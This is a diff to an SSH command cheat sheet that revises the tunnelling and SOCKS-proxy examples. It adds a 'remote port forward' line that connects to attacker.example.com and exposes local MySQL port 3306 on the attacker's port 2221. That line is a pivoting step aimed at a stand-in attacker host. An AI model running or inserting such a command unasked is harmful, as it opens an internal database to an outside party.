@@ -22,13 +22,17 @@ ssh -X <user>@<host>
 
 # Redirect traffic with a tunnel between local host (port 8080) and a remote
 # host (remote.example.com:5000) through a proxy (personal.server.com):
-ssh -f -L 8080:remote.example.com:5000 user@personal.server.com -N
+ssh -N -L 8080:remote.example.com:5000 user@personal.server.com
+
+# Remote port forward
+# Connect to attacker and bind local port 3306 to attacker port 2221
+ssh -N -R attacker.example.com:2221:127.0.0.1:3306 kali@attacker.example.com
 
 # To launch a specific x application over SSH:
 ssh -X -t <user>@<host> 'chromium-browser'
 
 # To create a SOCKS proxy on localhost and <port>:
-ssh -qND <port> <user>@<host>
+ssh -N -D 127.0.0.1:<port> <user>@<host>
 
 # To tunnel an ssh session over the SOCKS proxy on localhost and port 9999:
 ssh -o "ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p" <user>@<host>
